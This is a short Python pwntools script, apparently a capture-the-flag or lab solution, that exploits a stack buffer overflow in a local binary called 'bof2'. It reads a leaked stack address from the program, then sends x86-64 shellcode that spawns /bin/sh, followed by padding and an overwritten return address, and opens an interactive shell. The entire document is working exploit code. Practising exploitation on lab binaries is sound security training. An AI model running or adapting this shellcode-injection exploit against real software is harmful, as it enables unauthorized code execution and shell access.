from pwn import *

p = process("./bof2")

sc = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05"

output = p.recv(1024)
addr = output.split(b' @ ')[1].split(b'\n')[0]
addr = int(addr.decode(), 16)

payload = sc 
payload += b"A" * (0x208 - len(sc))
payload += p64(addr)
#gdb.attach(p)
#pause()
p.send(payload)
p.interactive()
